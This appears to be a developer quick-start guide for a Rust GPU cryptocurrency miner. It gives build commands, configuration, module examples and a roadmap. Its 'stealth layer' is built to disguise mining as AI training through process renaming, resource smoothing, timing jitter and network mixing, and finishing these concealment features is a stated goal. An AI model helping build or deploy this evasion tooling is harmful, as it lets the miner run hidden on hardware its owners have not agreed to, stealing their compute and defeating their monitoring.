# 🚀 QUICK DEVELOPER GUIDE
## Opus GPU Mining System - Hướng Dẫn Nhanh

**Phiên bản**: 1.0.0
**Cập nhật**: 2025-10-02

---

## 🎯 TL;DR (Too Long; Didn't Read)

```bash
# Clone & Build
git clone <repo>
cd app/app-gpu
cargo build --release

# Run CLI
./target/release/mining-cli start --config config/default.toml

# Run Tests
cargo test --workspace

# Docker Run
docker compose up
```

**Trạng thái hiện tại**: ✅ Structure complete, 🔄 Core mining pending (CUDA kernels needed)

---

## 📁 CODEBASE STRUCTURE

```
app-gpu/
├── crates/                          # Rust modules
│   ├── mining-core/                 # ⚙️ Core mining engine (40% done)
│   ├── stealth-layer/               # 🥷 Stealth capabilities (60% done)
│   ├── coordination/                # 🔗 Distributed coordination (100% done)
│   ├── security/                    # 🔒 Security hardening (100% done)
│   └── cli/                         # 💻 Command-line interface (100% done)
├── cuda/                            # 🎮 CUDA kernels (NOT STARTED)
├── config/                          # ⚙️ Configuration templates
├── docker/                          # 🐳 Container configs
├── scripts/                         # 🔧 Build scripts
└── docs/                            # 📚 Documentation
```

---

## ⚡ QUICK START

### Prerequisites
```bash
# Rust (1.70+)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# CUDA Toolkit (optional, for GPU)
# Download from https://developer.nvidia.com/cuda-downloads

# Docker (optional)
# https://docs.docker.com/get-docker/
```

### Build from Source
```bash
# Clone repository
git clone <repository-url>
cd app/app-gpu

# Build release
cargo build --release

# Build specific crate
cargo build -p mining-core --release

# Build CLI only
cargo build --bin mining-cli --release
```

### Run CLI
```bash
# Validate config
./target/release/mining-cli validate config/default.toml

# Start mining (foreground)
./target/release/mining-cli start --config config/default.toml

# Start mining (background)
./target/release/mining-cli start --config config/default.toml --daemon

# Show status
./target/release/mining-cli status

# Stop mining
./target/release/mining-cli stop
```

### Docker Deployment
```bash
# Build image
docker build -t opus-gpu:latest -f docker/Dockerfile.ubuntu-cuda .

# Run với GPU support
docker run --gpus all \
  --security-opt seccomp=config/seccomp-profile.json \
  --cap-drop=ALL \
  --read-only \
  -v $(pwd)/config:/app/config:ro \
  opus-gpu:latest start

# Docker Compose
docker compose up -d
```

---

## 🔧 DEVELOPMENT WORKFLOW

### Testing
```bash
# Run all tests
cargo test --workspace

# Run tests for specific crate
cargo test -p coordination

# Run with output
cargo test -- --nocapture

# Run benchmarks (future)
cargo bench
```

### Code Quality
```bash
# Format code
cargo fmt

# Lint with clippy
cargo clippy --all-targets --all-features

# Check without building
cargo check --workspace

# Audit dependencies
cargo audit
```

### Documentation
```bash
# Generate docs
cargo doc --workspace --no-deps --open

# Check for doc warnings
cargo doc --workspace --no-deps 2>&1 | grep warning

# Serve docs locally
python3 -m http.server 8000 --directory target/doc
```

---

## 📝 CONFIGURATION

### Config File Structure
```toml
[mining]
pool_url = "stratum+tcp://pool.example.com:3333"
wallet_address = "0x1234567890abcdef"
gpu_devices = [0, 1]                # GPU IDs to use
algorithm = "Ethash"                # Ethash, KawPow, RandomX
intensity = 0.8                     # 0.0 - 1.0

[stealth]
enabled = true
profile = "AiTraining"              # AiTraining, ImageProcessing, etc.
enable_process_renaming = true
enable_resource_smoothing = true

[coordination]
mode = "Standalone"                 # Standalone or Distributed
peers = []                          # Peer addresses if Distributed
health_check_interval = 30          # Seconds
metrics_interval = 60               # Seconds

[security]
enable_seccomp = true               # Syscall filtering
enable_namespaces = true            # Process isolation
enable_wallet_encryption = true
profile = "Production"              # Development, Standard, Production

[logging]
level = "info"                      # trace, debug, info, warn, error
format = "json"                     # json or text
```

### Environment Variables
```bash
# Rust logging
export RUST_LOG=info

# Specific module logging
export RUST_LOG=mining_core=debug,stealth_layer=trace

# Backtrace on panic
export RUST_BACKTRACE=1

# GPU device override
export CUDA_VISIBLE_DEVICES=0,1
```

---

## 🧩 MODULE USAGE EXAMPLES

### Mining Core
```rust
use mining_core::{MiningEngine, MiningConfig, MiningAlgorithm};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let config = MiningConfig {
        pool_url: "stratum+tcp://pool.example.com:3333".to_string(),
        wallet_address: "0x1234567890abcdef".to_string(),
        gpu_devices: vec![0, 1],
        algorithm: MiningAlgorithm::Ethash,
        intensity: 0.8,
    };

    let engine = MiningEngine::new(config)?;
    engine.start().await?;

    // Mining is now running...
    tokio::time::sleep(std::time::Duration::from_secs(60)).await;

    engine.stop().await?;
    Ok(())
}
```

### Stealth Layer
```rust
use stealth_layer::{StealthManager, StealthConfig, StealthProfile};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let config = StealthConfig {
        enabled: true,
        profile: StealthProfile::AiTraining,
        enable_process_renaming: true,
        enable_resource_smoothing: true,
        enable_timing_jitter: true,
        enable_network_mixing: false,
    };

    let manager = StealthManager::new(config);
    manager.activate().await?;

    // Mining with stealth active...

    manager.deactivate().await?;
    Ok(())
}
```

### Coordination
```rust
use coordination::{CoordinationManager, CoordinationConfig, CoordinationMode};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let config = CoordinationConfig {
        mode: CoordinationMode::Distributed,
        peers: vec!["192.168.1.100:8545".parse()?],
        health_check_interval: 30,
        metrics_interval: 60,
    };

    let manager = CoordinationManager::new(config);
    manager.start().await?;

    // Coordination is active...

    manager.stop().await?;
    Ok(())
}
```

### Security
```rust
use security::{SecurityManager, SecurityConfig, SecurityProfile};

fn main() -> anyhow::Result<()> {
    let config = SecurityConfig {
        enable_seccomp: true,
        enable_namespaces: true,
        enable_wallet_encryption: true,
        profile: SecurityProfile::Production,
    };

    let manager = SecurityManager::new(config);
    manager.apply_hardening()?;
    manager.drop_privileges()?;

    // Process is now hardened...

    Ok(())
}
```

---

## 🚨 TROUBLESHOOTING

### Build Errors

#### Missing libc dependency
```bash
# Error: use of unresolved module `libc`
# Fix: Add to Cargo.toml
libc = "0.2"
```

#### CUDA not found
```bash
# Error: cuda-runtime-sys compilation failed
# Fix: Install CUDA toolkit or disable GPU features
cargo build --no-default-features
```

#### Dependency conflicts
```bash
# Clean and rebuild
cargo clean
cargo update
cargo build --release
```

### Runtime Errors

#### GPU initialization failed
```bash
# Check NVIDIA drivers
nvidia-smi

# Check CUDA devices
ls /dev/nvidia*

# Try different GPU IDs
export CUDA_VISIBLE_DEVICES=0
```

#### Pool connection failed
```bash
# Check pool URL format
# Correct: stratum+tcp://pool.example.com:3333
# Incorrect: http://pool.example.com

# Test connectivity
telnet pool.example.com 3333

# Check wallet address format
# Ethash: 0x... (42 characters)
```

#### Permission denied (seccomp/namespaces)
```bash
# Requires root for namespace isolation
sudo ./target/release/mining-cli start

# Or disable security features
# In config.toml:
[security]
enable_seccomp = false
enable_namespaces = false
```

---

## 📊 MONITORING & METRICS

### CLI Status Display
```bash
# Real-time status
watch -n 1 ./target/release/mining-cli status

# JSON output
./target/release/mining-cli status --format json
```

### Logging
```bash
# Follow logs
tail -f /var/log/opus-mining/mining.log

# JSON logs
./target/release/mining-cli start --log-format json | jq .

# Filter by level
export RUST_LOG=warn
./target/release/mining-cli start
```

### Metrics Collection
```rust
// Get current stats
let stats = engine.get_stats().await?;
println!("Hashrate: {} MH/s", stats.hashrate);
println!("Accepted: {}", stats.accepted_shares);
println!("Rejected: {}", stats.rejected_shares);
```

---

## 🔒 SECURITY BEST PRACTICES

### Configuration Security
```bash
# Encrypt wallet address
./target/release/mining-cli encrypt-wallet \
  --wallet 0x1234567890abcdef \
  --password-file ~/.mining-password

# Use read-only config
chmod 400 config/production.toml
```

### Runtime Security
```bash
# Run as non-root user
useradd -r -s /bin/false mining
chown mining:mining /opt/opus-mining

# Use seccomp profile
./target/release/mining-cli start \
  --security-opt seccomp=config/seccomp-profile.json

# Enable all security features
[security]
enable_seccomp = true
enable_namespaces = true
enable_wallet_encryption = true
profile = "Production"
```

### Network Security
```bash
# Use SSL/TLS for pool connections
pool_url = "stratum+ssl://pool.example.com:3334"

# Firewall rules
sudo ufw allow out 3333/tcp  # Mining pool
sudo ufw deny in 3333/tcp    # No incoming connections
```

---

## 🧪 TESTING GUIDE

### Unit Tests
```bash
# Run all unit tests
cargo test --workspace

# Run with coverage
cargo tarpaulin --workspace --out Html

# Run specific test
cargo test test_mining_lifecycle
```

### Integration Tests
```bash
# Run integration tests
cargo test --test integration_tests

# With testnet pool
export TEST_POOL_URL="stratum+tcp://testnet.pool.com:3333"
cargo test --test integration_tests
```

### Benchmark Tests
```bash
# Run benchmarks
cargo bench

# Specific benchmark
cargo bench --bench hashrate_bench
```

### Manual Testing
```bash
# Test with testnet
./target/release/mining-cli start \
  --config config/testnet.toml \
  --verbose

# Dry run (no actual mining)
./target/release/mining-cli start \
  --config config/default.toml \
  --dry-run
```

---

## 🛠️ DEBUGGING

### Enable Debug Logging
```bash
# All modules
export RUST_LOG=debug
./target/release/mining-cli start

# Specific modules
export RUST_LOG=mining_core=trace,stealth_layer=debug
./target/release/mining-cli start
```

### Backtrace
```bash
# Full backtrace
export RUST_BACKTRACE=full
./target/release/mining-cli start

# Colored backtrace
cargo install color-backtrace
export RUST_BACKTRACE=1
```

### GDB Debugging
```bash
# Build with debug symbols
cargo build --bin mining-cli

# Debug with GDB
gdb ./target/debug/mining-cli
(gdb) run start --config config/default.toml
```

### Memory Debugging
```bash
# Valgrind
valgrind --leak-check=full ./target/release/mining-cli start

# heaptrack
heaptrack ./target/release/mining-cli start
heaptrack_gui heaptrack.mining-cli.<pid>.gz
```

---

## 📚 REFERENCES

### Documentation
- **Architecture**: `BAO-CAO-KY-THUAT-MINING-GPU.md`
- **Audit Report**: `SOURCE-CODE-AUDIT-REPORT.md`
- **Roadmap**: `PRODUCTION-ROADMAP.md`
- **Status**: `IMPLEMENTATION-STATUS.md`
- **API Docs**: `cargo doc --open`

### External Resources
- [Rust Book](https://doc.rust-lang.org/book/)
- [Tokio Tutorial](https://tokio.rs/tokio/tutorial)
- [CUDA Programming](https://docs.nvidia.com/cuda/)
- [Stratum Protocol](https://en.bitcoin.it/wiki/Stratum_mining_protocol)

### Community
- **GitHub Issues**: Report bugs and feature requests
- **Discord**: Community support (if available)
- **Stack Overflow**: Tag `rust` + `gpu-mining`

---

## 🎯 NEXT STEPS FOR DEVELOPERS

### Immediate (This Week)
1. Fix remaining build errors
2. Create GPU management skeleton
3. Research CUDA kernel implementations

### Short-term (2-4 Weeks)
1. Implement GPU management
2. Implement/fork CUDA kernels
3. Implement Stratum protocol
4. Integration testing

### Long-term (2-3 Months)
1. Complete stealth features
2. Security hardening
3. Performance optimization
4. Comprehensive testing
5. Production deployment

---

## ✅ CHECKLIST FOR NEW CONTRIBUTORS

- [ ] Read `BAO-CAO-KY-THUAT-MINING-GPU.md`
- [ ] Review `SOURCE-CODE-AUDIT-REPORT.md`
- [ ] Check `IMPLEMENTATION-STATUS.md` for current state
- [ ] Setup development environment
- [ ] Build project successfully
- [ ] Run existing tests
- [ ] Pick an issue from GitHub
- [ ] Create feature branch
- [ ] Write tests for changes
- [ ] Submit pull request

---

**Happy Coding! 🚀**

**Questions?** Check `IMPLEMENTATION-STATUS.md` or create a GitHub issue.
